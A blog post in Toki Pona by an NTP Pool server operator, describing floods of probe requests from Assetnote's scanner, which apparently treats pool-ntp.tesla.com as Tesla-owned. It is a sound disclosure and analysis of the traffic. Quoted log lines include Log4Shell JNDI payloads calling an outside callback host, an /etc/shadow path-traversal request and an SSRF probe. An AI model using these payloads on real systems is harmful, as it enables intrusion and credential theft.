@@ -1,0 +1,121 @@
+# kulupu Tesla li utala e mi lon linluwi
+
+# sin: ijo ni li pini pona
+
+jan Patrik pi kulupu Assetnote li toki tawa mi. toki ona li pona mute. ijo ni li pini. sina pona!
+
+ijo li lon tomo anpa pimeja pi linluwi IPv4 la ilo lukin mute a li kama tawa ona, li alasa e lupa ike, li tawa weka. tenpo pi mute ala la jan utala li kama, li awen nasa lon tenpo suli. ni ale li nasa ala. taso ilo nginx mi li sitelen e wile ale lon lipu sona. mi lukin e lipu ni la mi kama lukin e ijo nasa. wile utala li kama tan nanpa IP 3 taso, li awen kama. ijo nasa li ni: nimi sewi Host ona anu nimi sewi Referer ona li toki e nimi pool-ntp.tesla.com. nimi sewi User-Agent ona li nimi pi ilo Assetnote. kin la ona li alasa utala e mi kepeken nasin SSRF. ona li wile e ni: ilo pana mi li toki tawa nimi URL “callback” pi ilo Assetnote. wile wan li ni:
+
+```
+    35.168.63.24 - - [13/Sep/2026:01:14:31 -0700] "GET /?a=%3Cscript%20src=${jndi${:-:}ldap${:-:}//waf6.${date:MM-dd-yyyy}.pool-ntp.tesla.com.log4j.assetnote-callback.com/}>alert()%3C%2Fscript%3E HTTP/1.1" 299 817 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 ${jndi${:-:}ldap${:-:}//waf6.${date:MM-dd-yyyy}.pool-ntp.tesla.com.log4j.assetnote-callback.com/}" host=pool-ntp.tesla.com
+```
+
+wile ni li kama tan ilo lukin 3: 54.165.75.96 en 35.168.63.24 en 52.44.200.251. ona ale li lon linluwi AS pi kulupu Amazon Web Services (AMAZON-AES).
+
+ilo Assetnote li ilo esun pi jan ike ala. tenpo ni la lipu esun ona li kepeken nimi Searchlight Cyber. kulupu li pana e mani tawa ona la ona li lukin e ijo ale pi kulupu ni lon linluwi, li alasa e ni: jan utala li ken utala e seme? (toki Inli la “attack surface management”.) lon la ona li kepeken ilo lukin sama ni: ilo lukin li pali lon tenpo ale, li lukin e ijo pi kulupu ni. jan li wile ala lawa e pali ni. wile ni li tan ilo Assetnote lon la ona li pilin e ni: ilo pana mi li ilo insa pi kulupu Tesla. pilin ni li pakala. (lon la ilo Assetnote li kepeken kulupu AWS. ni li sama.)
+
+## ni li kama lon nasin seme
+
+kulupu Tesla li pana e nimi pool-ntp.tesla.com lon linluwi. nimi ni li nimi CNAME tawa nimi pool.ntp.org. nimi pool.ntp.org li kulupu NTP Pool. kulupu ni la jan mute li pana e ilo pana tenpo tan wile ona taso, tan mani ala. ilo kute li kama la kulupu li pana e ilo wan tawa ona, li pana e ilo ante tawa ilo kute ante. ilo pana mi li lon kulupu ni. (toki poka: kulupu Tesla o kepeken nimi “vendor zone” pi kulupu NTP Pool. ona o kepeken ala nimi CNAME pi ona taso lon anpa pi nimi tesla.com.)
+
+=> https://www.ntppool.org/   kulupu NTP Pool
+=> /blog/ntpuserinfo.gmi    ilo pana mi li lon kulupu ni
+
+ni li pilin mi taso. mi sona ala e lon ona: ken la ilo Assetnote li alasa e nimi ale lon anpa pi nimi tesla.com, li kama jo e nimi pool-ntp.tesla.com kin. nimi ni li nimi CNAME tawa pool.ntp.org. nimi pool.ntp.org li ken pana e nanpa IP pi ilo mi — 67.215.249.229. ken la lipu ijo pi ilo Assetnote li awen e nanpa ni, li toki e ni: ona li ijo pi kulupu Tesla. ni la ilo li open utala e mi. taso mi jan ante taso. ona li sona ala e mi.
+
+mi toki e ijo ni tawa kulupu Tesla kepeken lipu linluwi. tenpo ni la ona li awen toki ala tawa mi. mi sitelen e lipu ni kepeken toki Inli. toki pona la ona li ni:
+
+```
+toki,
+
+ni li toki ala e lupa ike pi kulupu Tesla. mi wile ala e ijo tan sina. taso mi wile pana e sona ni tawa sina: ken la sina ike lili tawa jan ante. sina wile ala e ni.
+
+ilo pana mi li lon kulupu NTP Pool. tenpo suno ~2 pini la ona li kama jo e wile ~8,000 tan ilo 2 pi ilo lukin sina: <54.165.75.96> en <35.168.63.24>. nimi UA ona li <Assetnote/1.0.0 (ExposureScan)>. wile mute li jo e utala. ilo li pali e utala ni tan lipu mama (toki Inli la “template”).
+
+utala ale li kepeken nimi ilo <pool-ntp.tesla.com>. mi pilin e ni: sina jo e nimi insa. nimi ni li pana e ilo ante lon tenpo ante. ilo ni li lon kulupu NTP Pool. ilo ni la mute suli li ijo pi kulupu Tesla ala. ilo sina li alasa e ijo sina lon linluwi. tawa lukin mi la ilo ni li pilin e ni: nanpa IP ale pi nimi <pool-ntp.tesla.com> li ijo sina. ni la ilo lukin li utala e ona ale. mi pilin e ni: sina wile ala e ni.
+
+ike li kama ala tawa mi. taso mi wile toki e ni tawa sina: **sina utala e nanpa IP pi jan ante. sina sona ala e jan ni**.
+
+sina wile la mi ken pana e lipu sona mi. mi ante ala e ona.
+
+jan Apen (Robin)
+dreamstation.systems / 67.215.249.229
+```
+
+## wile pi ilo lukin
+
+ona li alasa utala e mi kepeken nasin ale: tawa pi ken ala lon poki lipu (“path traversal”), pana pi ilo “webshell”, alasa lon insa pi ilo mute, alasa e lipu lawa pi ilo WordPress e lipu lawa pi ilo CMS ante, utala SSRF, utala Log4Shell, ijo ante mute.
+
+kin la ona li alasa e ni: ilo mi li toki tawa ilo ona (toki Inli la “callback”). wile 989 li jo e nimi ilo lon anpa pi nimi assetnote-callback.com. ni li alasa e lupa Log4Shell e lupa Text4Shell. wile 114 li jo e nimi canary.assetnotessrf.com. ni li alasa e lupa SSRF:
+
+```
+    GET /solr/admin/collections?action=${jndi:ldap://solr.${hostName}.${date:MM-dd-yyyy}.pool-ntp.tesla.com.log4j.assetnote-callback.com/a}
+```
+
+ijo musi wan li lon. mi sona ala e tan ona. wile 15 li jo e nimi sewi Host ni: login.solarcity.com. ona ale li wile e ni: GET /(S(x))/b/(S(x))in/System.Web.Mvc.dll. mi pilin e ni: ni li nasin nasa wan lon ilo ASP.NET. nasin ni li wile e ni: ilo li ante e /b/(S(x))in/ tawa /bin/.
+
+sona musi ante li lon kin. ona li lon ala nimi sewi Host, li lon ijo ante. mi lukin e nimi sewi Referer ale, e nimi URL ale, e pini URL ale (“query string”). ni la mi kama lukin e nimi ilo mute. ona li awen lon insa pi lipu mama ona a (“template”). wan li ni:
+
+```
+    GET /calendars/admin@lowlevelaccess.jlg.com/calendar/../../../mail/lowlevelaccess.jlg.com/admin/.x-attachment-1-y/new/../../../../../../../../../etc/shadow
+```
+
+mi lukin e nimi ilo ante pi kulupu ante kin. ni li lon ona: servicemcdonalds.com, saferas.com, rsmafghanistan.af, enrichcs.com.au, escience2010.org, al-forno.com.au, disneyfineart.com.
+
+kin la nanpa IP pi linluwi tomo (lipu RFC 1918) li lon nimi sewi Referer pi wile wan:
+
+```
+    GET /internal/v2/config/mps_secret/ADM_SESSIONID
+    Referer: http://192.168.178.222/admin_ui/mas/ent/html/main.html
+```
+
+kin la ilo lukin li alasa e lupa open ale (toki Inli la “port”), li toki tawa ona ale kepeken nasin HTTP. mi sona ala e tan. ilo SSH mi en ilo Postfix mi en ilo Dovecot mi li kama jo e toki HTTP jaki mute a.
+
+tenpo suno 2026-09-08 la mi open pana e nanpa pana 299 tawa wile ale ni: nimi sewi Host ona li pool-ntp.tesla.com. nasin HTTP li jo ala e nanpa 299. ken la jan li lukin e lipu sona pi ilo lukin. mi wile e ni: nanpa nasa ni li kama tawa lukin ona. nimi URL ale la mi pana e lipu sama ni. lipu li toki Inli. toki pona la ona li ni:
+
+```
+# ni li ilo pi kulupu Tesla ala!
+
+ni li ilo pana pi jan wan. jan ni li pali e ona tan musi. ona li pana e tenpo kepeken nasin NTP, li pana e lipu, li pali e ijo ante.
+
+tenpo suno pini lili la mi kama jo e wile mute a tan ilo lukin 2 pi ilo Assetnote (54.165.75.96 en 35.168.63.24). nimi sewi Host pi wile ni li pool-ntp.tesla.com.
+
+nimi pool-ntp.tesla.com li nimi CNAME tawa pool.ntp.org. nimi pool.ntp.org li pana e ilo ante lon tenpo ante. ilo pana tenpo mute mute li lon ona. jan li pana e ilo ni tan wile ona taso. tawa lukin mi la ilo lukin sina li kama awen lon ilo pana mi.
+
+sina pakala ala e mi. taso sina utala e nanpa IP pi jan ante. sina sona ala e jan ni.
+
+mi toki e ijo ni tawa VulnerabilityReporting@tesla.com kepeken lipu linluwi. sina wile la o pana e lipu linluwi tawa robin@dreamstation.systems. mi ken pana e lipu sona pi sona mute.
+```
+
+ike la pali ona li awen sama tawa lukin mi. tenpo ni la lipu ni li ante ala e ona.
+
+utala ona ale li pakala: wan ala li pali. mi pilin wawa tan ni.
+
+tan tenpo suno 2026-08-21 tawa tenpo ni la mi kama jo e wile 50,000 e mute kin tan ilo lukin Assetnote. wile li awen kama lon tenpo ni. tenpo kama la mi sin e lipu ni.
+
+(lon, mi ken weka e nanpa IP ona kepeken sinpin awen linluwi. taso lukin e ni li musi mute tawa mi. kin la mi wile e ni: jan wan pi kulupu Tesla li kama sona e ijo ni.)
+
+## ona li pali ala pali e ni tawa kulupu NTP Pool ale?
+
+jan lawa pi ilo pana lon kulupu NTP Pool li jo e tomo toki. mi wile sona e ni lon ona: jan ante li jo e ilo pana W3 lon nanpa IP sama pi ilo pana tenpo ona la ona li lukin ala lukin e ijo ni? jan lawa wan, jan Matt Nordhoff, li toki e ni: ona kin li lukin e ijo ni. tawa ona la ni li open lon tenpo suno 2026-08-15:
+
+```
+    $ sudo rg -zFI pool-ntp.tesla.com access.log* | awk '{print $1}' | sort | uniq -c | sort -gr | head
+       9126 54.165.75.96
+       7461 35.168.63.24
+       6123 52.44.200.251
+         11 64.227.103.50
+          6 146.190.142.16
+          4 3.101.230.148
+          3 3.88.188.142
+          3 3.101.216.68
+          2 54.213.2.72
+          2 54.202.10.40
+```
+
+taso jan ante ala li toki e ijo. mi wile sona e ni: tenpo ale la ilo lukin li alasa ala alasa sin e nanpa IP pi nimi pool-ntp.tesla.com? ni li lon la ona li utala e ilo ale ni: wawa nasa pi sona ma li pana e ona tawa ilo lukin. ante la ona li kama jo e nanpa IP pi mute lili tan kulupu NTP Pool lon tenpo wan, li utala mute e ona taso?
+
+=> /tok/blog/   o tawa lipu toki
+=> /tok/        o tawa lipu open
+
+=> /blog/tesla.gmi   English
